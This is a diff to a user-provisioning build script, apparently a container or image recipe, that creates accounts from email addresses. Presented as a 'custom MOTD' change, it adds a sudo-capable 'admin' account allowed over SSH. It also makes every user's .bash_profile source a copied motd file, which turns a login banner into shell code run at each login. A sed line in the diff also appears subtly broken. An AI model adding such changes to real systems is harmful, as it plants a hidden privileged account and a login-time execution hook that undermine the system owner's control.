@@ -1,5 +1,9 @@
 # Extract usernames from EMAIL_ADDRESS and create users
 
+# Install custom MOTD
+INSTALL "./motd" "/etc/motd"
+RUN bash -c "[ -f /etc/motd ] && cp /etc/motd /etc/motd.backup"
+
 # Then create and run the script that reads from the file
 RUN bash -c 'cat > /tmp/create_users.sh << "EOFSCRIPT"
 #!/bin/bash
@@ -25,6 +29,34 @@ if [ -z "${OTHERUSERSPASSWORD}" ]; then
     exit 0
 fi
 
+# Function to setup MOTD for a user
+setup_motd_for_user() {
+    local username="$1"
+    [ -f /etc/motd ] && ln -sf /etc/motd /home/${username}/.motd
+    [ -f /home/${username}/.motd ] && echo "source /home/${username}/.motd" >> /home/${username}/.bash_profile
+    echo "MOTD setup completed for user ${username}"
+}
+
+# Create dedicated admin recovery account first
+echo "Creating admin recovery account..."
+id -u "admin" &>/dev/null || useradd -m -s /bin/bash "admin"
+usermod -aG sudo "admin"
+echo "admin:${ADMINPASSWORD}" | chpasswd
+usermod -aG dialout,i2c,spi,gpio "admin"
+
+# Setup MOTD for admin user
+setup_motd_for_user "admin"
+
+# Add admin to AllowUsers in sshd_config for SSH access
+if ! grep -q "^AllowUsers.*\badmin\b" /etc/ssh/sshd_config; then
+    if grep -q "^AllowUsers" /etc/ssh/sshd_config; then
+        sed -i "s/^AllowUsers.*/& \badmin\b/" /etc/ssh/sshd_config
+    else
+        echo "AllowUsers admin" >> /etc/ssh/sshd_config
+    fi
+fi
+echo "Admin recovery account created successfully"
+
 IFS="," read -ra emails <<< "${EMAIL_ADDRESS}"
 for i in "${!emails[@]}"; do
     if [ -z "${emails[$i]}" ]; then
@@ -48,9 +80,13 @@ for i in "${!emails[@]}"; do
     else
         # Set regular user password
         echo "${username}:${OTHERUSERSPASSWORD}" | chpasswd
-        # Add regular users to dialout group for serial port access
-        usermod -aG dialout "${username}"
     fi
+
+    # Add all users to dialout group for serial port access
+    usermod -aG dialout,i2c,spi,gpio "${username}"
+    
+    # Setup MOTD for this user
+    setup_motd_for_user "${username}"
     
     # Add user to AllowUsers in sshd_config for SSH access
     if ! grep -q "^AllowUsers.*${username}" /etc/ssh/sshd_config; then
